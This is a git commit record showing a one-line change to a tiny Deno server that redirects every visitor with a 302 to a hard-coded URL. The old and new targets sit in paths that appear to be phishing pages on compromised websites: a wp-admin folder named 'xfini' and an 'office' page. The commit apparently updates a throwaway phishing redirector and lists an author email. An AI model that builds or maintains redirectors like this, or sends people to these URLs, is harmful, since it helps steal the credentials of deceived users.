3e7ee454e4cf8fd95c33d05bbe17c9ea41060ac7
Digital2025001 <bosmichael30@gmail.com>
2025-08-09 04:05:32 -0700

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://navsindia.org/wp-admin/xfini/NITY/s", // Replace this with your actual link
+      Location: "https://the-learning-project.foundation/prive/office/", // Replace this with your actual link
     },
   });
 });
